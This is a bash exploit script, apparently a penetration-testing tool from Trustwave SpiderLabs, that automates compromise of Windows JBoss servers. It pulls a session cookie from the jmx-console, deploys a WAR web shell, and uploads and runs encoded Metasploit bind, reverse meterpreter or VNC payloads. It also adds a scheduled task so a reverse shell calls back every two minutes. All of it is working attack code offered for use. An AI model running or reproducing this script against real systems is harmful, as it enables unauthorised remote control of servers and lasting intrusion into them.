#!/bin/bash
if [ -z $1 ]
then
printf "[!] JBoss Windows autopwn\n[!] Usage: $0 server port\n"
printf "[!] Christian Papathanasiou cpapathanasiou@trustwave.com\n[!] Trustwave SpiderLabs\n"
else

printf "[x] Retrieving cookie\n"
cookie=`printf "GET /jmx-console/ HTTP/1.1\nHost: $1\n\n" | nc $1 $2 | grep -i JSESSION | cut -d: -f2- | cut -d\; -f1`
printf "[x] Now creating BSH script...\n"
A=`sed "s/hostx/$1/g" war/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$cookie/g" | nc -v $1 $2 | grep -i file`
if [ -z "$A" ];
then 
printf "[!] Cound not create BSH script..\n"
else 
printf "[x] .war file created successfully on c: \n"
fi 
printf "[x] Now deploying .war file:\n"
I=`sed "s/hostx/$1/g" war/req2.win | sed "s/portx/$2/g" | sed "s/cookiex/$cookie/g" | nc $1 $2`
if [ -z "$I" ];
then 
printf "[x] Something went wrong...\n"
else

printf "[x] Web shell enabled!: http://$1:$2/browserwin/browser/Browser.jsp\n" 
browsercookie=`printf "GET /browserwin/browser/Browser.jsp HTTP/1.1\nHost: $1\n\n" | nc $1 $2 |  grep -i jsession | cut -d: -f2 | cut -d\; -f1`


printf "[x] Server name...:\n"
sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/ipconfig%20\/all/g" | sed -e "s/46/58/g" | nc $1 $2 | grep -i "host" 

printf "[x] Would you like a reverse or bind shell or vnc(bind)? "
read shell
rm -rf payload.exe tmp

if [ $shell == "bind" ]
then
printf "[x] On which port would you like your bindshell to listen? "
read port
msfpayload windows/shell_bind_tcp LPORT=$port R | msfencode -e x86/fnstenv_mov -c 5 -t raw | msfencode -e x86/countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -t raw -c 5 | msfencode -e x86/call4_dword_xor -t exe -c 5 >payload.exe
printf "[x] Uploading bindshell payload..\n"
curl -F "dir=c:\\" -F "sort=1" -F "name=MyFile" -F "filename=@payload.exe" -F "Submit=Upload" http://$1:$2/browserwin/browser/Browser.jsp 1>/dev/null 2>/dev/null
rm -rf payload.exe
printf "[x] Checking that bind shell was uploaded correctly..\n"
sleep 3 
sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/dir%20c:\\\\payload.exe/g" | sed -e "s/46/63/g" | nc $1 $2 2>&1 1>tmp
J=`cat tmp | grep -i payload`
rm -rf tmp
if [ -z "$J" ]
then 
printf "[!] Bindshell failed\n"
else 
printf "[x] Bind shell uploaded: $J\n"
printf "[x] Now executing bind shell...\n"
sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/c:\\\\payload.exe/g" | sed -e "s/46/60/g" | nc $1 $2 1>/dev/null 2>/dev/null  
printf "[x] Executed bindshell!\n"
printf "[x] Reverting to metasploit....\n"
msfcli exploit/multi/handler PAYLOAD=windows/shell_bind_tcp LPORT=$port RHOST=$1 E 
fi
fi

if [ $shell == "reverse" ]
then
printf "[x] On which IP you like your reverse shell? "
read myip
printf "[x] On which port would you like to accept your reverse shell? "
read port
msfpayload windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$port X>payload.exe 
#R | msfencode -e x86/fnstenv_mov -c 5 -t raw | msfencode -e x86/countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -t raw -c 5 | msfencode -e x86/call4_dword_xor -t exe -c 5 >payload.exe 
printf "[x] Uploading reverseshell payload..\n"
curl -F "dir=c:\\" -F "sort=1" -F "name=MyFile" -F "filename=@payload.exe" -F "Submit=Upload" http://$1:$2/browserwin/browser/Browser.jsp 1>/dev/null 2>/dev/null
rm -rf payload.exe
printf "[x] Checking that the reverse shell was uploaded correctly..\n"
sleep 3
sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/dir%20c:\\\\payload.exe/g" | sed -e "s/46/63/g" | nc $1 $2 2>&1 1>tmp
J=`cat tmp | grep -i payload`
rm -rf tmp
if [ -z "$J" ]
then
printf "[!] Reverse shell failed\n"
else
printf "[x] Reverse shell uploaded: $J\n"
sed "s/hostx/$1/g" execute/move | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" |  nc $1 $2 1>/dev/null 2>/dev/null  
printf "[x] Scheduling reverse shell to run every 2 minutes\n"
timer=`sed "s/hostx/$1/g" execute/schtasks | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" |  nc $1 $2 | grep -i success`
if [ -z "$timer" ]
then
printf "[!] Schtasks failed..\n"
else
printf "[x] Succesfully created schtasks expect a reverse shell every two minutes.\n"
printf "[!] Do not forget to delete the schtasks with: schtasks /tn sqlhost /delete /f\n"
printf "[!] Now run: msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$myip LPORT=$port E and expect a shell in 2 minutes..\n"
fi
fi
fi



if [ $shell == "vnc" ]
then
printf "[x] On which port would you like your  vnc shell to listen? "
read port
msfpayload windows/vncinject/bind_tcp LPORT=$port X> payload.exe
# | msfencode -e x86/fnstenv_mov -c 5 -t raw | msfencode -e x86/countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -t raw -c 5 | msfencode -e x86/call4_dword_xor -t exe -c 5 >payload.exe
printf "[x] Uploading vnc  shell payload..\n"
curl -F "dir=c:\\" -F "sort=1" -F "name=MyFile" -F "filename=@payload.exe" -F "Submit=Upload" http://$1:$2/browserwin/browser/Browser.jsp 1>/dev/null 2>/dev/null
rm -rf payload.exe
printf "[x] Checking that vnc shell was uploaded correctly..\n"
sleep 3
sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/dir%20c:\\\\payload.exe/g" | sed -e "s/46/63/g" | nc $1 $2 2>&1 1>tmp
J=`cat tmp | grep -i payload`
rm -rf tmp
if [ -z "$J" ]
then
printf "[!] vnc shell failed\n"
else
printf "[x] vnc shell uploaded: $J\n"
printf "[x] Now executing vnc  shell...\n"
sed "s/hostx/$1/g" execute/req1.win | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed -e "s/dir/c:\\\\payload.exe/g" | sed -e "s/46/60/g" | nc $1 $2 1>/dev/null 2>/dev/null
printf "[x] Executed  vnc shell!\n"
printf "[x] Reverting to metasploit....\n"
msfcli exploit/multi/handler PAYLOAD=windows/vncinject/bind_tcp LPORT=$port RHOST=$1 DisableCourtesyShell=TRUE E
fi
fi



fi
fi
